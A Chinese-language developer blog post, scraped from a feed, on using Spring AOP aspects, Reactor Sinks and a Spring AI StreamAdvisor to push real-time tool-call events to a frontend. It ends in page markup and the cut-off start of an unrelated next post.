<h2 data-id="heading-2">整体思路</h2>
<p>用户发请求 → Ai2ChatClient 接收 → SpringAI 处理 → 切面拦截工具调用 → 事件发布 → 实时推给前端<br/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53947da76b79484ea86270eab8de2212~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGVpa29vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769506730&amp;x-signature=3u6NwSvbULtMGpgxPcLVGpeTBFI%3D" alt="image.png" loading="lazy"/></p>
<p>就这么几条线。核心其实就三件事：切面拦截、事件发布、流合并。</p>
<hr/>
<h2 data-id="heading-3">AOP 依赖</h2>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    
	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-aop
    <span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  
</code></pre>
<hr/>
<h2 data-id="heading-4">举个例子：TodoList 工具</h2>
<p>这是我们项目里实际在用的工具类：</p>
<blockquote>
<p>具体提示词参考的是 OpenCode 的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanomalyco%2Fopencode%2Fblob%2Fdev%2Fpackages%2Fopencode%2Fsrc%2Ftool%2Ftodoread.txt" target="_blank" title="https://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/tool/todoread.txt" ref="nofollow noopener noreferrer">github.com/anomalyco/o…</a></p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TodolistTools</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTools</span> {    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Cache&lt;String, String&gt; TODOLIST_CACHE = Caffeine.newBuilder()    
            .maximumSize(<span class="hljs-number">10_00</span>)    
            .expireAfterWrite(Duration.ofMinutes(<span class="hljs-number">30</span>))    
            .build();    
    
	<span class="hljs-meta">@Tool(description = "Write or update the todo list for current task.")</span>    
	<span class="hljs-keyword">public</span> String <span class="hljs-title function_">todoWrite</span><span class="hljs-params">(    
	<span class="hljs-meta">@ToolParam(description = "The todo list content to save.")</span>    
	String todoContent,    
	ToolContext toolContext    
	)</span> {    
        <span class="hljs-type">String</span> <span class="hljs-variable">conversationId</span> <span class="hljs-operator">=</span> ConversationIdUtils.getConversationId(toolContext);    
<span class="hljs-keyword">if</span> (StringUtils.isBlank(todoContent)) {    
TODOLIST_CACHE.invalidate(conversationId);    
            <span class="hljs-keyword">return</span> <span class="hljs-string">"Todo list cleared."</span>;    
}    
TODOLIST_CACHE.put(conversationId, todoContent);    
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Todo list saved successfully."</span>;    
}    
    
<span class="hljs-meta">@Tool(description = "Read the current todo list for this conversation.")</span>    
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">todoRead</span><span class="hljs-params">(ToolContext toolContext)</span> {    
        <span class="hljs-type">String</span> <span class="hljs-variable">conversationId</span> <span class="hljs-operator">=</span> ConversationIdUtils.getConversationId(toolContext);    
<span class="hljs-type">String</span> <span class="hljs-variable">todoContent</span> <span class="hljs-operator">=</span> TODOLIST_CACHE.getIfPresent(conversationId);    
<span class="hljs-keyword">if</span> (StringUtils.isBlank(todoContent)) {    
            <span class="hljs-keyword">return</span> <span class="hljs-string">"No todo list for this conversation."</span>;    
}    
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Current todo list:\n"</span> + todoContent;    
}    
    
	<span class="hljs-meta">@Override</span> 
	String <span class="hljs-title function_">getToolName</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"Todo List Tool"</span>; }    
	
	<span class="hljs-meta">@Override</span> 
	String <span class="hljs-title function_">getToolDes</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"Read and write task todo lists"</span>; } 
 }  
</code></pre>
<hr/>
<h2 data-id="heading-5">切面是怎么工作的</h2>
<p>SpringAI 没给我们留回调接口，那就自己造一个。切面这东西好就好在不改动原代码，加个注解就能生效。</p>
<p>我们用 <code>@Before</code> 抓工具调用开始的那一刻，用 <code>@AfterReturning</code> 抓调用结束的那一刻。工具类丢给 Spring 容器，切面自己就找上门来了。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Aspect</span>  
<span class="hljs-meta">@Component</span>  
<span class="hljs-meta">@Slf4j</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolContextAspect</span> {    
    
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ToolEventPublisher toolEventPublisher;    
    
<span class="hljs-keyword">public</span> <span class="hljs-title function_">ToolContextAspect</span><span class="hljs-params">(ToolEventPublisher toolEventPublisher)</span> {    
        <span class="hljs-built_in">this</span>.toolEventPublisher = toolEventPublisher;    
}    
    
<span class="hljs-meta">@Pointcut("execution(* com.leikooo.codemother.ai.tools..*.*(..)) &amp;&amp; @annotation(org.springframework.ai.tool.annotation.Tool)")</span>    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">anyToolExecution</span><span class="hljs-params">()</span> {}    
    
<span class="hljs-meta">@Before("anyToolExecution()")</span>    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeToolCall</span><span class="hljs-params">(JoinPoint joinPoint)</span> {    
<span class="hljs-type">ToolContext</span> <span class="hljs-variable">toolContext</span> <span class="hljs-operator">=</span> getToolContext(joinPoint);    
<span class="hljs-keyword">if</span> (toolContext == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;handleToolContext(toolContext, joinPoint, <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);    
}    
    
<span class="hljs-meta">@AfterReturning(pointcut = "anyToolExecution()", returning = "result")</span>    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterToolCall</span><span class="hljs-params">(JoinPoint joinPoint, Object result)</span> {    
	<span class="hljs-type">ToolContext</span> <span class="hljs-variable">toolContext</span> <span class="hljs-operator">=</span> getToolContext(joinPoint);    
	<span class="hljs-keyword">if</span> (toolContext != <span class="hljs-literal">null</span>) {    
		handleToolContext(toolContext, joinPoint, result, <span class="hljs-literal">false</span>);    
	}    
}    
    
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleToolContext</span><span class="hljs-params">(ToolContext context, JoinPoint joinPoint, Object result, <span class="hljs-type">boolean</span> isBefore)</span> {    
	<span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> joinPoint.getTarget().getClass().getSimpleName();    
	<span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> joinPoint.getSignature().getName();    
	<span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> context.getToolCallHistory().getLast();    
	AssistantMessage.<span class="hljs-type">ToolCall</span> <span class="hljs-variable">toolCallInfo</span> <span class="hljs-operator">=</span> ((AssistantMessage) message).getToolCalls().getLast();    
	<span class="hljs-type">String</span> <span class="hljs-variable">toolCallId</span> <span class="hljs-operator">=</span> toolCallInfo.id();    
	<span class="hljs-type">String</span> <span class="hljs-variable">sessionId</span> <span class="hljs-operator">=</span> ConversationIdUtils.getConversationId(context);    
	<span class="hljs-keyword">if</span> (isBefore) {    
		toolEventPublisher.publishToolCall(sessionId, className, methodName, toolCallId);    
	} <span class="hljs-keyword">else</span> {    
		toolEventPublisher.publishToolResult(sessionId, className, methodName, toolCallId, result);    
	}    
}    
    
<span class="hljs-keyword">private</span> ToolContext <span class="hljs-title function_">getToolContext</span><span class="hljs-params">(JoinPoint joinPoint)</span> {    
	<span class="hljs-keyword">for</span> (Object arg : joinPoint.getArgs()) {    
		<span class="hljs-keyword">if</span> (arg <span class="hljs-keyword">instanceof</span> ToolContext) 
			<span class="hljs-keyword">return</span> (ToolContext) arg;
		}    
	    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    
	}  
}  
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bda2e507fedc4ceebcb0ca17977654fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGVpa29vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769506730&amp;x-signature=I2PWgJVYTgn0h0dGjWAeq5JYIC0%3D" alt="测试结果" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-6">事件发布：把消息送出去</h2>
<p>这里用到了 Project Reactor 的 Sinks。每个会话一个 Sink，多线程环境下也能正常工作。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolEventPublisher</span> {    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Sinks.Many&lt;ToolEvent&gt;&gt; sinks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();    
    
    <span class="hljs-keyword">private</span> Sinks.Many&lt;ToolEvent&gt; <span class="hljs-title function_">getSink</span><span class="hljs-params">(String sessionId)</span> {    
<span class="hljs-keyword">return</span> sinks.computeIfAbsent(sessionId, k -&gt; Sinks.many().multicast().onBackpressureBuffer());    
}    
    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publishToolCall</span><span class="hljs-params">(String sessionId, String toolName, String methodName, String toolCallId)</span> {    
	getSink(sessionId).tryEmitNext(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolEvent</span>(sessionId, <span class="hljs-string">"tool_call"</span>, toolName, methodName, toolCallId, <span class="hljs-literal">null</span>));    
}    
    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publishToolResult</span><span class="hljs-params">(String sessionId, String toolName, String methodName, String toolCallId, Object result)</span> {    
	getSink(sessionId).tryEmitNext(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolEvent</span>(sessionId, <span class="hljs-string">"tool_result"</span>, toolName, methodName, toolCallId, result));    
}    
    
    <span class="hljs-keyword">public</span> Flux&lt;ToolEvent&gt; <span class="hljs-title function_">events</span><span class="hljs-params">(String sessionId)</span> {    
<span class="hljs-keyword">return</span> getSink(sessionId).asFlux();    
}    
    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">complete</span><span class="hljs-params">(String sessionId)</span> {    
        Sinks.Many&lt;ToolEvent&gt; sink = sinks.remove(sessionId);    
<span class="hljs-keyword">if</span> (sink != <span class="hljs-literal">null</span>) sink.tryEmitComplete();    
}    
    
<span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">ToolEvent</span><span class="hljs-params">(String sessionId, String type, String toolName, String methodName, String toolCallId, Object result)</span> {} 
 }  
</code></pre>
<hr/>
<h2 data-id="heading-7">流怎么合并到主响应里</h2>
<p>这里有两种玩法</p>
<h3 data-id="heading-8">玩法一：自己动手丰衣足食</h3>
<p>直接在业务方法里把两个流 merge 起来。好处是代码都在明面上，坏处是每个方法都得写一遍。</p>
<blockquote>
<p><strong>一个小细节</strong>：<code>mainFlux</code> 结束时会触发 <code>doFinally</code>，但 <code>toolEventFlux</code> 不会。所以必须在 <code>doFinally</code> 里手动调用 <code>complete</code> 关掉事件流。否则这个流会一直挂在那儿，等不到终点。<br/>
前端就会一直这样  <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/787f7cff87684bf9928329098ae19ce8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGVpa29vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769506730&amp;x-signature=VaRXt%2FIWsqT0MrFeo4%2F6nr1j7n8%3D" alt="image.png" loading="lazy"/></p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ai2ChatClient</span> {    
	<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatClient chatClient;    
	<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ToolEventPublisher toolEventPublisher;    
    
<span class="hljs-keyword">public</span> <span class="hljs-title function_">Ai2ChatClient</span><span class="hljs-params">(ChatModel openAiChatModel, FileTools fileTools,    
ToolEventPublisher toolEventPublisher)</span> {    
        <span class="hljs-built_in">this</span>.toolEventPublisher = toolEventPublisher;    
        <span class="hljs-built_in">this</span>.chatClient = ChatClient.builder(openAiChatModel)    
                .defaultTools(fileTools)    
                .build();    
}    
    
    <span class="hljs-keyword">public</span> Flux&lt;String&gt; <span class="hljs-title function_">chat2Ai</span><span class="hljs-params">(String msg, String appId)</span> {    
        Flux&lt;String&gt; mainFlux = chatClient.prompt()  
                 .system(<span class="hljs-string">"""  
                        You are a helpful, precise, and reliable AI assistant.                        Respond clearly and concisely.                        Prioritize correctness, safety, and practicality.                        If information is uncertain, state the uncertainty explicitly.                                                """</span>)                  
                .user(msg)    
                .advisors(spec -&gt; spec.param(CONVERSATION_ID, appId))    
                .toolContext(Map.of(CONVERSATION_ID, appId))    
                .stream().content()    
                .doFinally(s -&gt; toolEventPublisher.complete(appId));    
    
        Flux&lt;String&gt; toolEventFlux = toolEventPublisher.events(appId)    
                .map(event -&gt; {    
                    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> Optional.ofNullable(event.result()).orElse(<span class="hljs-string">""</span>);    
<span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (event.type()) {    
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"tool_call"</span> -&gt; String.format(<span class="hljs-string">"正在进行工具调用: %s"</span>, event.methodName());    
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"tool_result"</span> -&gt; String.format(<span class="hljs-string">"工具调用完成: %s"</span>, event.methodName());    
                        <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">""</span>;    
};    
                    <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"\n\n[选择工具] %s \n\n"</span>, message);    
});    
    
        <span class="hljs-keyword">return</span> Flux.merge(mainFlux, toolEventFlux);    
}  }  
</code></pre>
<h3 data-id="heading-9">玩法二：把脏活累活扔给 Advisor</h3>
<p>写个 StreamAdvisor，让它自己处理流合并。业务代码瞬间清爽了。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>  
<span class="hljs-meta">@Component</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolAdvisor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CallAdvisor</span>, StreamAdvisor {    
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ToolEventPublisher toolEventPublisher;    
    
    <span class="hljs-meta">@Override</span> 
    <span class="hljs-keyword">public</span> ChatClientResponse <span class="hljs-title function_">adviseCall</span><span class="hljs-params">(ChatClientRequest request, CallAdvisorChain chain)</span> {    
<span class="hljs-keyword">return</span> chain.nextCall(request);    
}    
    <span class="hljs-meta">@Override</span>
     <span class="hljs-keyword">public</span> Flux&lt;ChatClientResponse&gt; <span class="hljs-title function_">adviseStream</span><span class="hljs-params">(ChatClientRequest request, StreamAdvisorChain chain)</span> {    
        <span class="hljs-type">String</span> <span class="hljs-variable">appId</span> <span class="hljs-operator">=</span> ConversationIdUtils.getConversationId(request.context());    
        Flux&lt;ChatClientResponse&gt; mainFlux = chain.nextStream(request)    
					<span class="hljs-comment">// 这里一定要 complete                </span>
					.doFinally(s -&gt; toolEventPublisher.complete(appId));    
        Flux&lt;ChatClientResponse&gt; toolEventFlux = getToolEventFlux(appId);    
        <span class="hljs-keyword">return</span> Flux.merge(mainFlux, toolEventFlux);    
}    
    <span class="hljs-keyword">private</span> Flux&lt;ChatClientResponse&gt; <span class="hljs-title function_">getToolEventFlux</span><span class="hljs-params">(String sessionId)</span> {    
		<span class="hljs-keyword">return</span> toolEventPublisher.events(sessionId)    
                .map(event -&gt; {    
<span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (event.type()) {    
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"tool_call"</span> -&gt; String.format(<span class="hljs-string">"正在进行工具调用: %s"</span>, event.methodName());    
                        <span class="hljs-keyword">case</span> <span class="hljs-string">"tool_result"</span> -&gt; String.format(<span class="hljs-string">"工具调用完成: %s"</span>, event.methodName());    
                        <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">""</span>;    
};    
                    <span class="hljs-type">AssistantMessage</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssistantMessage</span>(String.format(<span class="hljs-string">"\n\n[选择工具] %s \n\n"</span>, message));    
                    <span class="hljs-keyword">return</span> ChatClientResponse.builder()    
                            .chatResponse(ChatResponse.builder().generations(List.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Generation</span>(msg))).build())    
                            .build();    
});    
}    
    <span class="hljs-meta">@Override</span> 
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"ToolAdvisor"</span>; }    
    
	<span class="hljs-meta">@Override</span> 
	<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getOrder</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> Integer.MIN_VALUE + <span class="hljs-number">100</span>; 
	}  
}  
</code></pre>
<p>注册一下，全局生效：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ai2ChatClient</span> {    
	<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatClient chatClient;    
	<span class="hljs-keyword">public</span> <span class="hljs-title function_">Ai2ChatClient</span><span class="hljs-params">(ChatModel openAiChatModel, FileTools fileTools, ToolAdvisor toolAdvisor)</span> {    
		<span class="hljs-built_in">this</span>.chatClient = ChatClient.builder(openAiChatModel)    
				.defaultTools(fileTools)    
				.defaultAdvisors(toolAdvisor)    
				.build();    
	}    
    <span class="hljs-keyword">public</span> Flux&lt;String&gt; <span class="hljs-title function_">chat</span><span class="hljs-params">(String msg, String appId)</span> {    
	<span class="hljs-keyword">return</span> chatClient.prompt()  
	                 .system(<span class="hljs-string">"""  
	                        You are a helpful, precise, and reliable AI assistant.                        Respond clearly and concisely.                        Prioritize correctness, safety, and practicality.                        If information is uncertain, state the uncertainty explicitly.                                                """</span>)  
	                .user(msg)    
	                .advisors(spec -&gt; spec.param(CONVERSATION_ID, appId))    
	                .toolContext(Map.of(CONVERSATION_ID, appId))    
	                .stream().content();    
	} 
}  
</code></pre>
<hr/>
<h2 data-id="heading-10">两种方案怎么选</h2>

























<table><thead><tr><th>看什么</th><th>方案一自己写</th><th>方案二用 Advisor</th></tr></thead><tbody><tr><td>代码位置</td><td>业务方法里</td><td>单独一个类</td></tr><tr><td>复用性</td><td>惨不忍睹</td><td>一次编写到处使用</td></tr><tr><td>代码量</td><td>挺长</td><td>业务方法就几行</td></tr></tbody></table>
<p>我的建议是使用 advisor</p>
<hr/>
<h2 data-id="heading-11">怎么拿到 conversationId</h2>
<p>Langchain4j 那个 <code>@ToolMemoryId</code> 是真方便。SpringAI 不给咱们就自己想办法。</p>
<p>在工具方法里加个 <code>ToolContext</code> 参数，从里面把 id 拽出来：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>  
<span class="hljs-meta">@Component</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileWriteTool</span> {    
	<span class="hljs-meta">@Tool("写入文件到指定路径")</span>    
	<span class="hljs-keyword">public</span> String <span class="hljs-title function_">writeFile</span><span class="hljs-params">(    
	<span class="hljs-meta">@P("文件的相对路径")</span> String relativeFilePath,    
	<span class="hljs-meta">@P("要写入文件的内容")</span> String content,    
	ToolContext toolContext    
	)</span> {    
		<span class="hljs-type">String</span> <span class="hljs-variable">conversationId</span> <span class="hljs-operator">=</span> toolContext.getContext()    
		        .get(ChatMemory.CONVERSATION_ID).toString();    
		<span class="hljs-comment">// 接下来就能使用了</span>
    }  
}  
</code></pre>
<p>这个 id 是在调用链上通过 <code>toolContext</code> 传进来的：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Flux&lt;String&gt; <span class="hljs-title function_">chat2AiAdvisor</span><span class="hljs-params">(String msg, String appId)</span> {  
    <span class="hljs-keyword">return</span> chatClient.prompt()  
            .system(<span class="hljs-string">"你是有用的小助手"</span>)  
            .user(msg)  
            .advisors(advisorSpec -&gt; advisorSpec.param(CONVERSATION_ID, appId))  
            <span class="hljs-comment">// 这里设置到 ToolContext            .toolContext(Map.of(CONVERSATION_ID, appId))  </span>
            .stream().content();  
}  
</code></pre>
<hr/>
<h2 data-id="heading-12">跑一下看看</h2>
<p>写个测试用例，验证整个链路通不通：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootTest</span>  
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Ai2ChatClientTest</span> {    
	<span class="hljs-meta">@Resource</span> 
	<span class="hljs-keyword">private</span> Ai2ChatClient ai2ChatClient;    
    
	<span class="hljs-meta">@Test</span>    
	<span class="hljs-keyword">void</span> <span class="hljs-title function_">chat2Ai</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {    
        Flux&lt;String&gt; flux = ai2ChatClient.chat(<span class="hljs-string">"帮我生成一个企业级别的后端，帮我生成 todolist"</span>, <span class="hljs-string">"12345"</span>);    
        flux.doOnNext(System.out::println).subscribe();    
        Thread.sleep(<span class="hljs-number">10000</span>);    
	}  
}  
</code></pre>
<p>跑起来，控制台陆陆续续打出日志，工具调用的事件也正常推送。整个链路是通的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b64ffe6ce9c4412b83e08cb3a64546aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGVpa29vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769506730&amp;x-signature=l3Y8eRcYjVBlKdVMkmmTisPqD7o%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Claude vs ChatGPT：联网能力的设计差异]]></title>    <link>https://juejin.cn/post/7597058147749347338</link>    <guid>https://juejin.cn/post/7597058147749347338</guid>    <pubDate>2026-01-20T09:52:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597058147749347338" data-draft-id="7597058147749281802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Claude vs ChatGPT：联网能力的设计差异"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-20T09:52:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="hugo_im"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476706589"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Claude vs ChatGPT：联网能力的设计差异
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476706589/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    hugo_im
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:52:36.000Z" title="Tue Jan 20 2026 09:52:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 